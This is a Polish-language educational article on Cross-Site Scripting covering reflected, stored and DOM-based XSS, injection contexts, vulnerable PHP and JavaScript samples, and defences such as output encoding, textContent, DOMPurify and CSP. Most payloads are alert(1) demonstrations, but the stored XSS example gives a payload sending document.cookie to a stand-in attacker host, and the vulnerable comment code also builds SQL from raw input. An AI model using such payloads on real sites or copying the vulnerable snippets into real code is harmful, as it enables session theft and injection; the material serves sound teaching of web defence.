# Analiza Podatności Cross-Site Scripting (XSS)


Podatność **Cross-Site Scripting (XSS)** jest jednym z najpowszechniejszych zagrożeń dla aplikacji webowych. Polega na możliwości **wstrzyknięcia i wykonania złośliwego kodu JavaScript** w przeglądarce innego użytkownika w kontekście atakowanej domeny.



Atak ten staje się możliwy, gdy aplikacja wyświetla dane pochodzące od użytkownika bez odpowiedniego ich **enkodowania lub filtrowania**, traktując je jako część kodu strony.

**Główne konsekwencje:**
* **Pełne przejęcie sesji użytkownika.**
* Kradzież danych (klucze API, e-maile, dane bankowe).
* Wykonywanie akcji w imieniu ofiary (przelewy, zmiana haseł).

**Skuteczna obrona** wymaga **kontekstowego enkodowania danych** oraz stosowania nowoczesnych frameworków (React, Angular) z wbudowanym mechanizmem **autoescaping**.

---

## 1. Definicja i Rodzaje Podatności XSS

**Cross-Site Scripting (XSS)** to podatność polegająca na osadzeniu w treści strony internetowej własnego kodu JavaScript, który jest następnie wykonywany w przeglądarkach innych użytkowników.

> **Dowód podatności (PoC):** Często jest to wykonanie kodu `<script>alert(1)</script>`, wywołującego okno dialogowe.

### Typy Podatności XSS

Wyróżnia się trzy główne kategorie ataków:

#### 1.1. Reflected XSS (Odbity)
Najprostszy typ XSS. Złośliwy kod (payload) jest częścią zapytania HTTP (np. parametru w URL). Serwer odbiera zapytanie i **"odbija" złośliwy kod w odpowiedzi HTML**, który jest natychmiast wykonywany przez przeglądarkę ofiary.



* **Mechanizm:** Atakujący musi skłonić ofiarę do kliknięcia w specjalnie spreparowany link.
* **Przykład:** `http://example.com/search?query=<script>alert(1)</script>`

#### 1.2. Stored/Persistent XSS (Przechowywany)
Złośliwy kod jest **trwale zapisywany po stronie serwera** (np. w bazie danych jako komentarz czy post). Jest on serwowany automatycznie wszystkim użytkownikom odwiedzającym zainfekowaną podstronę.



* **Mechanizm:** Atakujący umieszcza kod raz; ofiara nie musi klikać w żaden specjalny link, wystarczy, że wejdzie na stronę.
* **Przykład:** Komentarz na blogu: `Bardzo fajny blog!<script>...</script>`.

#### 1.3. DOM-based XSS (Oparty na DOM)
Występuje **wyłącznie po stronie klienta**. Podatność leży w kodzie JavaScript aplikacji, który w niebezpieczny sposób modyfikuje **Document Object Model (DOM)**, używając danych od użytkownika (np. z fragmentu URL po `#`).



* **Mechanizm:** Złośliwy kod **nie jest wysyłany do serwera**. Payload jest przetwarzany tylko przez JS w przeglądarce.
* **Przykład:** Kod pobiera `location.hash` i wstawia go przez `innerHTML`.
    URL: `http://example.com#"/><img src=x onerror=alert(1)>`

---

## 2. Skutki i Konsekwencje Ataków XSS

Realne skutki wykraczają daleko poza wyświetlenie alertu:

* **Wykradanie (eksfiltracja) danych:** Odczyt i wysyłka informacji z kontekstu sesji (ciasteczka sesyjne, tokeny, dane osobowe, dane finansowe).
* **Wykonywanie dowolnych akcji:** Symulowanie kliknięć i działań użytkownika (zmiana hasła, usuwanie danych, zlecanie przelewów).
* **Keylogging:** Przechwytywanie wpisywanych znaków.
* **Skanowanie sieci:** Użycie przeglądarki ofiary jako proxy do skanowania sieci wewnętrznej.
* **Wykorzystanie narzędzi:** Np. **BeEF (The Browser Exploitation Framework)** do automatyzacji przejmowania sesji.

---

## 3. Konteksty Wstrzyknięcia XSS

Klucz do obrony to zrozumienie, że **każdy kontekst wymaga innego sposobu zabezpieczenia**.

| Kontekst Wstrzyknięcia | Fragment Kodu | Metoda Ataku | Metoda Obrony |
| :--- | :--- | :--- | :--- |
| **W zawartości tagu HTML** | `<div>[XSS]</div>` | Wstrzyknięcie nowego tagu, np. `<img src=x onerror=alert(1)>`. | Zamiana znaków specjalnych HTML (`<`, `>`, `"`, `'`, `&`) na **encje**. |
| **W atrybucie HTML (cudzysłów)** | `<div class="[XSS]">` | Zamknięcie cudzysłowu i dodanie atrybutu/tagu: `"><script>...`. | Zamiana znaków specjalnych HTML na **encje**. |
| **W atrybucie HTML (bez cudzysłowu)** | `<div class=[XSS]>` | Użycie spacji do dodania nowego atrybutu: `x onclick=alert(1)`. | **Zawsze** używać cudzysłowów dla atrybutów + enkodowanie HTML. |
| **W atrybutach URL (href, src)** | `<a href="[XSS]">` | Użycie protokołu `javascript:alert(1)`. | **Walidacja protokołu** (tylko `http`, `https`). Enkodowanie HTML tu nie wystarczy. |
| **Wewnątrz stringu JavaScript** | `var x = "[XSS]";` | Ucieczka ze stringu `";alert(1)//` lub zamknięcie tagu script `</script>...`. | Enkodowanie znaków do formatu Unicode **\uXXXX**. |
| **W atrybucie zdarzenia JS** | `<div onclick="...">` | Wielopoziomowe dekodowanie przez przeglądarkę. | **Wielowarstwowe enkodowanie** (najpierw dla JS, potem dla HTML). |

### 3.1. Konteksty DOM XSS (Sinks & Sources)
Podatność wynika z przepływu danych od źródła (**Source**, np. `location.hash`) do niebezpiecznego punktu wyjścia (**Sink**).

**Niebezpieczne funkcje (Sinks):**
* Wykonywanie kodu: `eval()`, `setTimeout(string)`.
* Wstawianie HTML: `innerHTML`, `outerHTML`, `document.write()`.
* Właściwości URL: `location`, `element.href`.

### 3.2. XSS Poza HTML
* **Pliki HTML/SVG:** Wgranie pliku `.svg` z tagiem `<script>` na serwer w tej samej domenie.
* **Pliki XML:** Możliwość interpretacji jako XHTML.

---

## 4. Metody Obrony przed XSS

Kompleksowa ochrona wymaga podejścia wielowarstwowego.



1.  **Systemy Szablonów z Autoescapingiem:**
    Najskuteczniejsza metoda. Frameworki takie jak **React, Angular, Vue, TWIG, Jinja** domyślnie enkodują zmienne.
    * *Uwaga:* Zazwyczaj nie chronią przed `javascript:` w linkach.

2.  **Filtrowanie (Sanityzacja) HTML:**
    Jeśli użytkownik *musi* wpisywać HTML (np. edytor WYSIWYG), użyj bibliotek typu **DOMPurify**. Usuwają one niebezpieczne tagi (script, iframe) i atrybuty (onerror). Nie używaj do tego własnych wyrażeń regularnych (Regex).

3.  **Content-Security-Policy (CSP):**
    Nagłówek HTTP, który definiuje dozwolone źródła skryptów. Skutecznie blokuje wykonanie nieautoryzowanego kodu JS, nawet przy istniejącej podatności.

4.  **Bezpieczne Wgrywanie Plików:**
    Pliki od użytkowników powinny być serwowane z **osobnej domeny** (sandbox), aby nie miały dostępu do ciasteczek głównej aplikacji.

5.  **Ochrona przed DOM XSS:**
    * Unikaj `innerHTML` – używaj `textContent` lub `innerText`.
    * Unikaj `eval()`.

### 4.1. XSS w Bibliotekach JS (React, Angular, Vue)
Mimo domyślnego bezpieczeństwa, frameworki posiadają funkcje "niebezpieczne", które wyłączają enkodowanie:
* **React:** `dangerouslySetInnerHTML`.
* **Angular:** `[innerHTML]` (choć Angular posiada wbudowany sanitizer).
* **Template Injection:** Zagrożenie przy dynamicznym generowaniu szablonów z danych użytkownika (np. `{{ constructor... }}`). Szablony muszą być **statyczne**.

### 5. Przykłady Ataków Cross-Site Scripting (XSS) i Metody Obrony

Poniższe przykłady ilustrują mechanizmy działania trzech głównych typów XSS oraz sposoby zabezpieczania kodu.

> **Uwaga:** Przykłady służą wyłącznie celom edukacyjnym.

---

## 1. Reflected XSS (Odbity)

W tym scenariuszu aplikacja pobiera dane z URL (np. parametry wyszukiwania) i wyświetla je użytkownikowi bez filtrowania.



### Scenariusz: Wyszukiwarka

**Podatny kod (PHP):**
```php
<div>
    Wyniki wyszukiwania dla: <?php echo $_GET['q']; ?>
</div>
```

**Atak (Payload):**
Atakujący wysyła ofierze link:
`http://example.com/search?q=<script>alert('Twoje ciasteczka: ' + document.cookie)</script>`

**Wynik:**
Serwer generuje stronę, wstawiając skrypt bezpośrednio do HTML:

```html
<div>
    Wyniki wyszukiwania dla: <script>alert('Twoje ciasteczka: ' + document.cookie)</script>
</div>
```
Przeglądarka ofiary wykonuje skrypt.

---

## 2. Stored XSS (Przechowywany)

Atakujący zapisuje złośliwy kod na serwerze. Kod ten wykonuje się później u każdego, kto odwiedzi stronę.



### Scenariusz: System komentarzy

**Podatny kod (PHP - zapis i odczyt):**

```php
// ZAPIS (brak sanityzacji przy wprowadzaniu do bazy)
$comment = $_POST['comment'];
$db->query("INSERT INTO comments (content) VALUES ('$comment')");

// ODCZYT (brak enkodowania przy wyświetlaniu)
$row = $db->query("SELECT content FROM comments")->fetch();
echo "<div class='comment'>" . $row['content'] . "</div>";
```

**Atak (Payload):**
Atakujący wpisuje w formularzu komentarza:
`Świetny post! <script>fetch('http://hacker.com/steal?cookie='+document.cookie)</script>`

**Wynik:**
Każdy użytkownik (w tym administrator), który wejdzie na stronę z komentarzami, nieświadomie wyśle swoje ciasteczka sesyjne na serwer atakującego.

---

## 3. DOM-based XSS

Błąd występuje po stronie klienta (JavaScript). Serwer może zwrócić bezpieczną stronę, ale skrypt na stronie przetwarza dane w niebezpieczny sposób.



### Scenariusz: Wybór języka w URL

**Podatny kod (JavaScript):**

```html
<div id="message"></div>

<script>
    // Pobranie fragmentu URL po znaku # (hash)
    var lang = location.hash.substring(1);
    
    // NIEBEZPIECZNE: użycie innerHTML bez walidacji
    document.getElementById("message").innerHTML = "Wybrany język: " + lang;
</script>
```

**Atak (Payload):**
Link przesłany ofierze:
`http://example.com/#<img src=x onerror=alert(1)>`

**Wynik:**
Przeglądarka próbuje wstawić obrazek ze źródłem `x`. Ponieważ taki obrazek nie istnieje, odpala się zdarzenie `onerror`, które wykonuje `alert(1)`.

---

## 4. Przykłady Kontekstowe i Obejścia

Tabela w Twoim tekście wspominała o różnych kontekstach. Oto jak one wyglądają w kodzie:

### A. Wstrzyknięcie w atrybut (Atrybutowy XSS)
**Podatny kod:**
```html
<input value="<?php echo $_GET['user']; ?>">
```

**Atak:** `"><script>alert(1)</script>`

**Wynikowy HTML:**
```html
<input value=""><script>alert(1)</script>">
```
Atakujący "zamknął" atrybut value i tag input, a następnie wstawił własny skrypt.

### B. Protokół JavaScript w linkach
**Podatny kod:**
```html
<a href="<?php echo $_GET['url']; ?>">Odwiedź stronę</a>
```

**Atak:** `javascript:alert(1)`

**Wynikowy HTML:**
```html
<a href="javascript:alert(1)">Odwiedź stronę</a>
```
Kliknięcie w link nie przenosi na stronę, lecz wykonuje kod JS.

---

## 5. Metody Obrony (Secure Code)

Oto jak naprawić powyższe błędy.

### Naprawa Reflected/Stored XSS (Enkodowanie encji)
W PHP używamy `htmlspecialchars()`, które zamienia znaki specjalne (`<`, `>`, `"`, `'`) na bezpieczne encje (`&lt;`, `&gt;` itd.).

```php
<div>
    Wyniki dla: <?php echo htmlspecialchars($_GET['q'], ENT_QUOTES, 'UTF-8'); ?>
</div>
```
**Wynik w HTML (bezpieczny):**
`&lt;script&gt;alert(1)&lt;/script&gt;` (Przeglądarka wyświetli tekst, ale go nie wykona).

### Naprawa DOM XSS (Bezpieczne metody)
Zamiast `innerHTML`, używaj `textContent` lub `innerText`, które traktują wsad jako zwykły tekst.

```javascript
var lang = location.hash.substring(1);
// BEZPIECZNE
document.getElementById("message").textContent = "Wybrany język: " + lang;
```

### Ochrona we Frameworkach (React)
React domyślnie enkoduje dane (Autoescaping).

```javascript
// Bezpieczne - React zamieni <script> na tekst
<div>{userInput}</div>

// Niebezpieczne - odpowiednik innerHTML (używać tylko z DOMPurify!)
<div dangerouslySetInnerHTML={{__html: userInput}}></div>
```

### Sanityzacja (DOMPurify)
Gdy musisz pozwolić użytkownikowi na wpisywanie HTML (np. edytor tekstu), użyj biblioteki czyszczącej.

```javascript
// Dane wejściowe: <img src=x onerror=alert(1)><b>Cześć</b>
let clean = DOMPurify.sanitize(dirtyInput);
// Wynik: <b>Cześć</b> (niebezpieczny obrazek został wycięty)
document.getElementById("content").innerHTML = clean;
```
